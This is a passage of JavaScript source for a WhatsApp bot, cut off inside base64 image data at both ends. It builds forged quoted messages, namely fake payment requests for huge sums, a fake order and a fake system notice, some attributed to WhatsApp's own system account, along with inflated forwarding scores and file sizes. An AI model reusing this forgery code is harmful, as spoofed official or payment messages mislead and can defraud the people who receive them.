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'}}}
// REPLY WITH STATUS
const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": 'znn Bot',"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": ppnyauser,"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
// REPLY WITH CONTACT
const fkontak2 = {key: {fromMe: false, participant: `${m.sender.split('@')[0]}@s.whatsapp.net`, ...(m.chat ? { remoteJid: '0@s.whatsapp.net' } : {}) }, message: {contactMessage: {displayName: `${pushname}`, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;a,;;;\nFN:${pushname}\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`}}}
// REPLY WITH PAYMENT & AMOUNT
const repPy = { key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id: `xznn with dazxan`, participant: '0@s.whatsapp.net' }, message: { requestPaymentMessage: { currencyCodeIso4217: "USD", amount1000: 1, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: `PROJECT znnZATION` }}, expiryTimestamp: 999999999, amount: { value: 91929291929, offset: 1000, currencyCode: "USD" }}}}
const Pareploy = (teks) => { znn.sendMessage(m.chat, { text: teks, contextInfo:{ forwardingScore: 2000000000, isForwarded: false }}, { quoted : repPy })}
// REPLY WITH AUDIO
const dalwin = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, "message": { "audioMessage": { "url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true", "mimetype": "audio/mp4", "fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=", "fileLength": "1067401", "seconds": 60, "ptt": true, "mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=", "fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=", "directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172", "mediaKeyTimestamp": "1684161893" }}}
// REPLY WITH KATALOG 2
const dallwinn = { key: {fromMe: [], participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "0@s.whatsapp.net" } : {})}, 'message': { "interactiveMessage": { "header": { "hasMediaAttachment": [], "jpegThumbnail": ppnyauser, }, "nativeFlowMessage": { "buttons": [ {"name": "review_and_pay","buttonParamsJson": "{\"currency\":\"IDR\",\"external_payment_configurations\":[{\"uri\":\"\",\"type\":\"payment_instruction\",\"payment_instruction\":\"hey ini test\"}],\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":2500000,\"offset\":100},\"reference_id\":\"4MX98934S0D\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":2500000,\"offset\":100},\"items\":[{\"retailer_id\":\"6348642505244872\",\"product_id\":\"6348642505244872\",\"name\":\"Winnn\",\"amount\":{\"value\":2500000,\"offset\":100},\"quantity\":1}]}}"}]}}}}
// REPLY WITH PAYMENT
const fpayment2 = {key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id: `zann 👨🏾‍🦽`, participant: '0@s.whatsapp.net' }, message: { requestPaymentMessage: { currencyCodeIso4217: "USD", amount1000: 1, requestFrom: '0@s.whatsapp.net', noteMessage: {extendedTextMessage: {text: `x-znn`}}, expiryTimestamp: 999999999, amount: { value: 91929291929, offset: 1000, currencyCode: "USD"}}}}
// SEND TEXT WITH REPLY
const repteks = (teks) => { znn.sendMessage(m.chat, { text: teks, contextInfo:{ forwardingScore: 9999999, isForwarded: false }}, { quoted : m })}
// SEND TEXT NO REPLY
const reply = async(teks) => {znn.sendMessage(from, {text: teks, mentions: await ments(teks)},{quoted:fcall})}
const replys = async(id, teks, quoted) => znn.sendMessage(id, {text: teks, mentions: await ments(teks), contextInfo: {mentionedJid: await ments(teks), externalAdReply: {showAdAttribution: true, title: `${salam} ${pushname}`, body: fake, previewType: 'PHOTO', thumbnail: ppnyauser, sourceUrl: 'https://wa.me/'+global.owner.split('@')[0] }}}, {quoted})
const replyf = async(id, teks) => znn.sendMessage(id, {text: teks, mentions: await ments(teks), contextInfo: {mentionedJid: await ments(teks), externalAdReply: {showAdAttribution: false, title: `${salam} ${pushname}`, body: fake, mediaType: 1, previewType: 'PHOTO', thumbnail: ppnyauser, sourceUrl: global.gcs }}}, {quoted: global.f1('[ System Notice ]', ppnyauser)})

// REPLY NEWSLETTER


// SEND MESSAGE DOCUMENT
const sendres = (huhu, teks) => {
znn.sendMessage(huhu, {
document: fs.readFileSync('./assets/sticker/znn.png'),
fileName: `${salam}`,
mimetype: "image/png",
fileLength: 99999999999,
jpegThumbnail: fs.readFileSync('./assets/sticker/alice.png'),
description: 'hello',
caption: teks,
contextInfo: {
isForwarded: true,
mentionedJid: [m.sender], 
businessMessageForwardInfo: {  
businessOwnerJid: global.owner 
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `POWERED BY X-ZNN`,
newsletterJid: global.idsal},
externalAdReply: { 
title: `znn`, 
body: `Online On ${runtime(process.uptime())}`,
thumbnailUrl: "https://telegra.ph/file/6282feedc20a080f851f6.jpg",
sourceUrl: `${global.saluran}`,
mediaType: 1,
renderLargerThumbnail: true }}},
{quoted:floc})}

// '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAYGBgYHBgcICAcKCwoLCg8ODAwODxYQERAREBYiFRkVFRkVIh4kHhweJB42KiYmKjY+NDI0PkxERExfWl98fKcBBgYGBgcGBwgIBwoLCgsKDw4MDA4PFhAREBEQFiIVGRUVGRUiHiQeHB4kHjYqJiYqNj40MjQ+TERETF9aX3x8p//CABEIAt0C3wMBIgACEQEDEQH/xAAzAAACAwEBAQAAAAAAAAAAAAAAAQIDBAUGBwEBAQEBAQEBAAAAAAAAAAAAAAECAwQFBv/aAAwDAQACEAMQAAAC9LJSzhU30bkrKZWWlUpZqRNV8vq1axkMunvw5vUy52u5GOnx+oYc9AFDBAAABAQAKAFUNAldtMiYCldgU2tSMrksgKAATRRXrCJml1zeg6QQkeHbDOuS5Lzd6YSyVXj3XdMcZdKe5zbtiSqclCGgAQAACkACAACnF0ubvK6POtT6HWS54nn05OlnNO5nCzPLpUHz0RitYz5d3P7c7Nrv83oYPn0AAApiEAIUZhBWBWoBXba5ai0IzhXZeUXqAEarXlCYiSqhLdLGzYh6iACm4M1sqOubULtkEJys/b0cuvG36lkk0nN5Hp+S1zU1ohoQ0gmCAACxAQJqgBDJrhXNTNz6DfnuzxeXbh20uM5quMo65yIWc9VEJTA46+PoGqcdbZp6gABkssvAlAADMWVztRSCUWeGbrKJlji9RV3IYAhgqNCigvq56rUo89V7ctfTO8T65AFIyUZp25e+LAXbnHTmszu5NctJNCjJHFw+l4k1kA0QCIaBNAAIBEBQAggOfXrx6n0eTc5HO6PO6TYOIlNFco03DqWzjq5qvzeuN8Z6g06AEAAAUiZ0WiRKNA89mTNdiOHSbrNZusw29sXQnf1zlegrOaCs5pDLHYow19Ixrm2aM3Kx3czSagNhNBXYRjmQ9XGRGPWboh5uomhJxCq2MvAo73FWtMpACTVgAIaRAUCaCAjzengs9/co65Wczbk3jdGSzshNVDLqpuYbq5+H1EI3jAoE6YIYAReZHoFKwFAzyUyhLz9JFMtyF+tennN0Q641gTQIGgABHCQZst1HLe+3mdPeauT28/TBbz+hw6AjGmgDDtr1M6rn7eF9+Lbx6qLWKk1AmlWPZGPOx6fNtSCkBYgAQIhqhNDTViovR6/UO4zYdtXTjolz+hnSaa1VSs49JDj5+xJOJOL3kdVtAANZwvTGJqABzdWXjZ1w6+1OlHq54aqrvJ0rlOXPT2Y6e+OqZr/RhidgIHk1YsWmTj8/vDo4bPRjeg9fHBLTzWepCdfm7TIylg0pcsdnP9XKW/Bo6ZvTXHok0JNSpNEeX1Yy+eWzHSA1ECQAEBSGgARAV7kpsZzR003nLJsq1NCyXy1X59Hk9LAxUMHXbVvNrC0CEkHG4ALWAAiTmwh1emLmHUAAIOZOdvh7VSvCrTm0e3ixFgIHFhmkrvL1xV9DDz10hHv4PFsquKL8HS8/WLjLnuVc4yvBvo1Ms6X7+HRQebsgUCECEJNS18ns1HCV1OgguQCkACAAEE1Z7OdL3ytyShMl8GmaiVO51mn873sTQaeoVq6hoHllcjAUaYAgz6cW8S2ZtXo5gKaYgKbsuVkw8vYAK7sdno53Uu3FqVxm1V6iMO2i+UQ8slty6ZkZJdsZtUKdY3OS8voTYQG5eUacfr5brsWyUQsaEAk0qQoIyiZ+T3cZy1KO4ArBNAAACCHZ7Om2jpwtzzq1mVmMuK76dfLvoi4+H12NNGBpTfRcjjKocwBwlDSKJV2D52zF6OO26L2YkrFBJ51Plq0UfP0mipbgKAAjJpCdFxVOeeLFZQXiSwV2dMmfrY9Z6Rj2NAAgUtGPo5NZzdHldD2c7ULh0EIE0qQQk4hFo5+Duc6sia1BNWACAFIBPY06at8aKdB055XKjeLNnJ7Hj9bjJeP0SnWybhLUrtjKiq2kuIuIypnk5Qs0rtqs1MsCXr8+1Iumo5M24lb5ugBjVVtVsVxCLoONWAUxFlVtM5Z0X5y8RFTr0QiSqquyOLXu5nS0aa6ZE1KUXUS83QZ/bx6kXHjtoSiASECcQQhVXQOVR1udZUg3ABAFYAHr1WunnjGNfXBRfl6Zh3OJ2vn+2NlVnj7tNEpp6yFVlSptqJSjKWmyM8lNPchZXZXOvx7Pf5NNCr49ZTm/J1mwtBIqvqnFYV5uiE69S1xlQAVudEXJlZNfL6OLVK3AvQA1mEJRjNqzTxvYI7YaahUaIy08fscz0c988mrQQZ0JAIQIQRcQQhUaIpya+hh2imrkFXZaZKq97VOPTy0BV2xRBw65l2uJ2vl+9Thb5O6Y6cJVXM5grpuoqyUZxXZGVACVW1W1w9PO63p894XeP0VWZ9NSrnEIyhDkpEKLM+da2S3liasQjqsqLQgYLbMetdTmdLBhrt5nTiuEJ2VwK+XTpgd+YCACM+PZn1MnR5HV9fOSFy2IQJoSaEpREQoNK5mQ7XMwVaXU0rpiUYg0B9DjKHXyVZtGftiu/PHUOzxO3833Rtpu8vdtRqF1VsjAp59GYunFjAoQRVKKOb0adPLUbsureab6bdHFg6baYuBGHPHXd7kQmLAAAHVZElVbjqdsb+7HbCfJz+nTl06PL63npelnuq8nTrOi70cmmgTS1RkZcTdVD38d6Fy21Xll2nHyHez8GNdXJkgXV1R0vjS7JQtkZo6s1yMNENH0Ku+nr5M1V1fbFdW5s8zu8PreH1yupu8XqdNtdXiYNOjPozpewAAE0taSyptpt56ttS6Yruqt0ASxywlG7NowWSt0HosFVZ5lg8tmsTACDDu5u10XFaNluar8219hTXZyZsvR5XHfV1YtrAVzsAFjC3PFHL73mfXyvx5ITpbGmNaI0qycbZmd6CWpW01ZXZBJgQqNFOpGNtesoCvoCb7eXJpjK50ZljzLYxXDtusrn4PbXfn0UxOxigEZ1peBawQJwiCayz3UXY3qrnV0xcJ0U28+nplDovzyjJqMp2E4S81ux6aa1AZAA8Gl9ZC7DZu68seft2LuViuew/PdyNnG60JrJ0eT1fLaL81+ZMRoU3ZJdPkfXcTrnzZTt9GYSZjbqsiWRTBxkKq2FkojE07CE1VMq7rKVOFz9CRHt5SrRKMl6z1ZkszZvUlU/l+8vrnUnFoVTrL6Lqi8ToAorsUUxdOLXpy6s6uqRrOiE8u5oxbOTtvVd1qzbL05WvU+iujXiwtnRslqsov5xwlmJ2VZvQy4loduhk5PL6+Xbzu6rnmX+pvXzvqfH9jOt2ym3y9MmnFs42wDeVzt/OXo5NTs+c7Kl7eekDn0EBGdc7AAAErnXZQJgBZntiU67Unv3CPXzypcd4jXOvpyVazanRsy6fh/V0OLllXZUTUJxZTbCrSuzUYgACvHsyYtO7m9HG6oxr1Opg3ZOub7aNHaGfRz61X5Ofu9efBva7Oayxzwb+Z0+Os83lk2Z76sjNsPROLx+9xLrl9XnP1+X6X5vlc3N9T3OL2+WvO9Xn9XHSu+iXm3i3c/d5tXAuuVg3ZCejn9BfIcv0Hnvbw2kJZ6MQQsjGyYEoAQkRsk0DBWFN1NWDE9s4nq8jhHPczz6dac3T0aOfTFbl0/O9mlxfHbrq0lVlV4655pbNGXTuMCwAiOHoYpcHQ5+rl1hqx9H0YUVDrm+PM4XbHqMvFz16qvzffWjfpzTenbXNjBuhZBh3ZciyN+TrmdHL32eG6c+7we4/V5MPI9hyG/Qapw8fpzWyM9aapU+dHXj1+Xd6DpiOfRRpz+tw+5nfK8j7nw/t4W3ZdNNApCUCwEMQOE6rLQJWkWOq2NMhYnr10pdvPi0yz51pzZ46ig49M13VXeXtrEvnejPrxWTVl9VupVQ6uer9eDd1y2iwAR0XRXi2ROPbTux2+/lj5HNfTlQlPtz79ney4ciHN9+vkvSZ9GOlwEoAEJgmAAB5n01e84Ot5unt5dl2H0PPtKNcuXcacvOiU+fV+vJr8tslCfXCovo04/V5W7HTb4P3vh/X58uqifeWCMacWrG65jEDi2RlXYAAwCq2q2z39FS78SItZUXGxRcdSN2e3ydttVmX5nrnTox511ghvGOKWdPqZdXbIwkAjEkFc3L1ePnp1vM9zyf0OPZ6nU5WuXjz2vl+2KnR3u3Pg/R/nn0PzdkmuPYAgBiGgAAAAAz6CISaVRnFUwOQW1+TdmvHt4C2m7pkptr1OHqzSx17Xj/X+W9Xn5kIr1c9SRjbEVGcJIwFYgjZXNGAo5WxksuR6xC9XmIkbCIrFEjqJxo5b7PP38z4f0N+W6lrqZtOHeKejzNnVbfwO/qMT5x1zjlIpuVcbs4dH5f10/bmzgaer04+K9FwvR+rzZ9Grgcs7+3zOh5/axPOwAAAGgGCAAAAATUomhALzqrK/HuevHq42V9F3TBXOOpws8+Fu+9892efrHlhS9nKydVudAIE42TCcsC5y1XKuNBnFtrTsALPXJL1eZxS1CLz2W0ZpTVZohx69TGHyPZeV289dDmdHl7zMsq9LD6TzvoFsE+PMaZi1ZzGtMa7dTn9HFs9RiNo8jtV758S3tNCcXjbadANEMEMAAMWzEtujmbVuAZBAIcsRo5kJQ8fWejPbwt91VvXmoM1PBUD+hw9ZPndbz9PFNP1c3fn2ZtcnCWbpC6EQbixuLJCYADK42ewRl9fm0581mdQlZDl1cGc9xGEL66vN02X5tPj7asOrKX28/revPC7nK6a6Ci/hzYmU0a8s1G2mvF30zq750Cfp02nY5RkjabI06GhGAAIYgMezmrG2u262tEwAKhoQI5JRf4O0pwlxbpKXbnWKG54Jo+hw6PpvH+x4b8K0ejEpwcWCagANSgFEsdEbL41BJEtZiXPee9ZOHLqRksaQ0RUgiSkRr0yxaNOTR4fRpzW05r0Z6tzXdM9GHowb+EAEebRTWZTr4dK+jztnfMdNL7S5j7UYMtpoNOgBAAAAADNoF52qyagCCAEAsmzzCVdXh9vw9Zyhdx1tA68qqbcvSeKB/Q4HtvEev49PHgdsNoq4rWVsaypxTsQwBiJys1FIn05wWm7XPqjPB70pISk6g7JxCU1ghqM7uo570U20+Xsyu5Yb8ereY7cljOoDWHFlY6tFHLcNeS3sur2VejMrMWyyTDQaaAFAAxAxAAAIGIAEMQCYVeA7vndc+h6Hy/qPH2WvJu829Ca6c68G/mdZ5MD6HBem8z3ue+AD6YQ0ASEyREnZrNU7HvECzVrGO3bPXHPZatc6mJrpjPmfVRKZCcpZRbjAgEgFCSJUh4vTG2m1Xqy3zNkJVbz02nrAAUUbcWdVJ1Ndd4d30OZm0uBpjE7BoGIGIGIAEMz1mxea9IMEAJXk0c5PHQ9xnufJ+tnR5ek+jzun5tzhOveJcPu4eufFL1XO9vPjdjk9WTkDfXMXIuRllkZ23dOOe3RVvEHK3Sx1NyaslFMrCE0J0XOXzPrxcoytIkaQCECIghFE5U8esrIPz9p3UWXOvJrzJ1JZdO+bBWPLpjLjrnDn08/6rzU/pcvVvFsptAwEGgYgYgdNqMctCtdGghSQNCGHCs27KNOdJtrn5Pe4fC3dXmdTzFCxawqrq+q1SPTcfm/V0MeFezJ6OCnZr6cq7nLt5k2rmg0uartC5kV1ZupYY46bKaVnpKDMdfUhHxelpIBIaECECECEEGqqsKuPS+eezj06Oe/NiaNfM6Gs3iNYYgyV7MWOmPzvrPJevl6HXgu79+7LgdBz3gMsQMQjQACVoAAAEDXOM/muzyvVxt9d4/d24+qK7fn+w4vb43HVvSwb/ADAC5UJ19V6kvQrhdXFfkPb8nry4jjL2/NcoQsuMtWem6vKY6XVj59UiWdthCQ1Q609Ug8vZIQIQ0gElDQgiKkJUCQVWQOxnJeHvHZnka7KL98xoHj2QXDw+1l1ararvZ2EwN+CNz6A8/rc+qZdTACGIGIABQOaSyux1VGqVnnNPR5/1/j6PS+R7Pn7dbjdrjfL92rXRf5TQIoSXeXAdqhhEZXkMHrfI9vO2IJjhDaicZVJkA0JymUOVtd4R5eiQqEgEIEIEIIuIRFQiNF+bv87z7M2jyd5xZGy3NZvneAg0Vho6fLzvDqrs93QJLViMtSYRJJNGnnJjuT87Yz3lyr2dzo5yWURudnNTC2G5zs8t6rnenycIR9b53q+XTo+F9XoyDwdBNFV+fV2jA7BMENB4z2fE1nzklbrMXIFGcpaXZbFE7VLXMalMwTvsTopLlWkqEkNCBCBCCIgi40RcDb1qJ+TpgGufW1JYPfxer356ym7OWJhh3RXkOS79QkemwU0sCSIjSoaEmCqlazFGgclMc1Ji7dVa5DRc+Uq6XN+v82Pc4mrzd/RgfC9qBFenPo9EYHUDBJgqrUeIs25rIyslEaLJqoStjOtduLks0R56jKt50djm9vvz5AlMiSppIaENJDiIERHEVBHVl3M2nJ4+ueLWOrSDGUbffy7F1EvLLWEgAYq+jyNa1U9LH7dUKauq1NLBTSxUkRUqSVzrSOhSHOM2ZaKehcTYTkUW0D8p7Px3v8tOvndXWfRxjP8AP+4hOFR05tPojA7GBAmhJo43M7/DCOi3Fxa73y1WWrlalNTUSZqVro7e2eftsffHBSXKNJUCQ0IEIERGkqcRIbufsze5j14/F2oQs9CmejvnNd1peyczXTo82bXTbxywAyawx7eX1/ZedX0sXTVMbE3Wppa1NLCu5hTfWlrjMc42MadcZXiNZ5FprsDy/qON2x5zsc3o+zydu6i7899EhOCVbOd0PUlVZh6zoCcgmlSaWHI7XJ50lYeewU4wlJS1unm7nc6WPb6c5a963MllO9PNkTkcRUCEEKgQERKISCEAlZ6bNi6Hh7Y4u90fTb93NMKeDfTJXdQ/DbgEYgpd2LtOlCZ6mCrp5G80bIt1qcWkpBEkCkNJbsvSvIChzJQ0A0D5u/y3o4V6ct/s8veuy6fzf1HCcDLtyy9DXz9nP7zrtCAEJNCxbceNJSfmQnzuNudnlYX2yEdW57dqLVi55a9HLvueaROQSBojYxAIQIQIVCBEgF1OXVZ0ctMvo+cug/Xx6fY8oefr7I4PU+f64Cfj6XlF/no0wovLHbk1+6CZpny9KtrnRvqbipJpDBSUk26YTcaM9PSskChuOPecPOUPr/Mo01z5dO9r5+7819ScJVIqL8nTW/DfR7Z1Z1WzACBNQsuvlmfgUORCjqTUTUO3w/WR2oTeenO22Ahh5ZIzlxEjEApwCIqaEghAhAiuxabfS97lNj5deNzPWx9HHyZ1OX9PwrRStZ9RV5zs/K92yypfI9OgDmGiqtVVfozrA9MAKWXWS8o2ZnSsY0pKdnSaHHBuQMQV+asp+p891Sl6eBFwXt6edr/KfZ2RbwqxbMVqnTL33s2xbk0AJqDFsorw9SsuItqwG5qr3fi/fgwzsaaIdVeWcXjIgARTQkSaBBSTiCELdX6e6bHnqA0AdLDvN58ivTec+r8+qu6v0cbvS+T7Xx/b0bKbfj+tgh573qChq98pdpZS7QhXeRyjqZW81p